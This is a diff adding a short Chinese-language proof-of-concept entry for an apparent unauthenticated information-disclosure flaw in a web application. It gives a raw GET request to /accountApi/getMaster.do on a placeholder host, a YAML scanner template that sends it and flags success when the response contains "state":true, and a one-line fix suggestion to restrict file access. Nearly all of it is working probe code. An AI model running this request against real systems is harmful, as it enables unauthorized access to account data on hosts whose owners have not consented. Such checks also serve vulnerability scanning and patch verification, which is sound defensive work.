@@ -1,0 +1,21 @@
+成功条件：相应包状态码 200 相应包内容包含关键词："\"state\":true"
+
+GET /accountApi/getMaster.do HTTP/1.1
+Host: [你的主机名或IP地址]
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36
+
+
+poc:
+  relative: req0
+  session: false
+  requests:
+  - method: GET
+    timeout: 10
+    path: /accountApi/getMaster.do
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/65.0.881.36 Safari/537.36
+    follow_redirects: true
+    matches: (code.eq("200") && body.contains("\"state\":true"))
+修复建议：
+限制文件访问
